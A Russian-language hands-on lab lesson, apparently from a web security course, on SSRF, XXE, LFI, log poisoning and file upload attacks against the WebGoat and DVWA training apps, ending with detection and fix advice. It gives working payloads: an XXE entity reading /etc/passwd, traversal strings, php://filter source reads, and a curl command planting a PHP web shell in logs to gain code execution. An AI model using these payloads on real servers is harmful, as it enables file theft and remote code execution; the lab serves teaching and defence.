# 8.3 — SSRF, XXE, LFI, загрузка файлов

> **M08 · Этап 1 · 5 ч · 🟡 · артефакт:** `labs/m08-web-api/l03-ssrf/`

## Цель

Научиться использовать сервер как прокси к внутренним ресурсам и превращать чтение файла в выполнение кода.

## Результат

- SSRF, читающий внутренний сервис.
- XXE, читающий файл.
- LFI и upload, дающие код.

## Теория

- SSRF: сервер делает запрос по URL, который контролирует пользователь.
- Опасные схемы: `file://`, `gopher://`, `dict://`, `http://169.254.169.254/` (cloud metadata).
- XXE: XML-парсер обрабатывает внешние сущности (`SYSTEM "file://..."`).
- LFI: путь к файлу управляется пользователем; `php://filter` помогает читать исходники.
- Log poisoning: пишем PHP-код в лог, затем включаем лог через LFI.
- Upload: расширение, MIME, магия файла; `.php`, `.phtml`, `.phar`, double extension.
- Все проверки — только в своей лабе.

## Лаборатория

### 1. SSRF (WebGoat)

Запустите WebGoat (`docker run -d -p 8081:8080 webgoat/webgoat`), зарегистрируйтесь, откройте урок SSRF.

Введите URL:

```
http://10.10.10.30:8000/
```

Ожидаемо: сервер WebGoat делает запрос к вашему LNX01 и показывает ответ. Это SSRF: запрос идёт с сервера, а не из браузера.

Проверьте `http://127.0.0.1:8080/` (DVWA) и `file:///etc/passwd` (если разрешено).

### 2. XXE (WebGoat)

В уроке XXE отправьте:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<comment><text>&xxe;</text></comment>
```

Ожидаемо: содержимое `/etc/passwd` в ответе.

### 3. LFI (DVWA)

```
../../../../etc/passwd
```

Ожидаемо: файл. Затем исходник:

```
php://filter/convert.base64-encode/resource=index.php
```

Декодируйте base64 — получите PHP-код.

### 4. Log poisoning → RCE

1. Вставьте PHP-код в `User-Agent` (или в лог SSH):

```bash
curl -A '<?php system($_GET["c"]); ?>' http://10.10.10.30/
```

2. Подключите лог через LFI:

```
../../../../var/log/nginx/access.log
```

3. Передайте `&c=id`.

Ожидаемо: выполнение `id`. Это классическая цепочка LFI → RCE.

### 5. Upload (DVWA)

Загрузите `probe.php`:

```php
<?php echo "ok"; ?>
```

Ожидаемо: файл доступен и выполняется. Попробуйте обойти фильтр medium: другое расширение, MIME, магия.

## Атака и защита

- **Атака:** SSRF → внутренние API/метаданные; XXE → файлы/SSRF; LFI → RCE; upload → webshell.
- **Детект:** исходящие запросы с сервера, XML с `DOCTYPE`, пути с `../`, загрузка исполняемых файлов.
- **Фикс:** allowlist URL и путей, отключить external entities, хранить upload вне webroot, переименовывать, проверять магию, `noexec`.
